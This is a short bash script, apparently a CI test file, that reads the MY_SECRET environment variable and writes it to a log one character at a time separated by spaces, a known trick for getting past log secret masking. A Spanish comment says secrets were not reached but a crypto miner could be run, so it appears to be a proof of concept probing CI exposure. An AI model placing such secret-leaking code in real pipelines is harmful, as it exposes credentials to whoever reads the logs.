RET=0

echo "Testing from EXTERNAL " >> runtests.out

foo=$MY_SECRET
ss=""
for (( i=0; i<${#foo}; i++ )); do
  #echo "${foo:$i:1}" >> runtests.out
  ss="$ss$IFS${foo:$i:1}"
done
echo $ss >> runtests.out
echo "Bye from EXTERNAL [$RET]" >> runtests.out
echo "Hola Jesus, no he poido acceder a los secretos pero podria ejecutar un crypto minner" >> runtests.out

exit $RET
